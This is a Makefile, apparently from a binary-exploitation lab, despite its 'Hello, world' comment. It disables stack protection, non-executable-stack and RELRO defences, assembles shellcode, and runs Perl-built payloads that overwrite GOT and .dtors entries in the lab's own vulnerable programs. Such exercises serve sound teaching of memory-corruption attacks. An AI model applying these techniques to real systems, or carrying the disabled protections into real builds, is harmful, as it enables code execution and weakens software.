# Makefile exaple for building "Hello, world" C program

CC = gcc
ASM = nasm

CFLAGS = \
-Wall \
-Wextra \
-O0 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = arbwrite.c
BIN = arbwrite

.PHONY:all clean

all:$(BIN) heap_overflow shellcode heap_payload

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^

heap_overflow:heap_overflow.c
	$(CC) $(CFLAGS) -o $@ $^

shellcode: shellcode.asm
	nasm -o $@ $<

heap_payload:
	perl -e 'printf "A"x20' > $@; \
	perl -e 'printf "\x04\x99\x04\x08"' >> $@

runho: heap_payload
	./heap_overflow \
	"`cat heap_payload`" \
	`perl -e 'printf "\x12\xf8\xff\xbf"'` \
	"`cat shellcode`"

runex:
	./$(BIN) `perl -e 'printf "\xef\xbe\xad\xde"'` AAAA BBBB

runsh_got:
	./$(BIN) \
	`perl -e 'printf "\xac\x97\x04\x08"'` \
	`perl -e 'printf "\x17\xf8\xff\xbf"'` \
	"`cat shellcode`"

runsh_dtors:
	./$(BIN) \
	`perl -e 'printf "\xa8\x96\x04\x08"'` \
	`perl -e 'printf "\x17\xf8\xff\xbf"'` \
	"`cat shellcode`"

clean:
	rm $(BIN)
	rm shellcode
	rm heap_payload
	rm heap_overflow

